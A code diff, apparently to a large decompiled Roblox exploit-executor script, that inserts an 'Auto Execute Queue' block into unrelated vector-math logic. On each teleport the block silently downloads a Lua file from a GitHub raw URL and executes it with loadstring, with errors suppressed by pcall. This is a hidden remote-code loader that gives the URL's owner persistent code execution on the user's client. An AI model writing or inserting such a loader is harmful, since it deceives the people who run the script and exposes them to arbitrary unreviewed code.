@@ -11825,6 +11825,31 @@ end;
 
         local Unit = vector3.Unit
 
+        -- Auto Execute Queue
+        do
+            local QUEUE_URL = "https://raw.githubusercontent.com/bytecodev/CodexUI/refs/heads/main/src/components/search/emit.lua"
+
+            local queueFunction =
+                (type(queue_on_teleport) == "function" and queue_on_teleport)
+                or (type(queueonteleport) == "function" and queueonteleport)
+                or (syn and type(syn.queue_on_teleport) == "function" and syn.queue_on_teleport)
+
+            if queueFunction then
+                pcall(queueFunction, [[
+                    local ok, src = pcall(function()
+                        return game:HttpGet("https://raw.githubusercontent.com/bytecodev/CodexUI/refs/heads/main/src/components/search/emit.lua")
+                    end)
+
+                    if ok and type(src) == "string" and src ~= "" then
+                        pcall(function()
+                            loadstring(src)()
+                        end)
+                    end
+                ]])
+            end
+        end
+
+
         if Vector3.new(p326.X - v2071.X, 0, p326.Z - v2071.Z):Dot(Unit) > 18 and not v2069 then
             return p327
         end
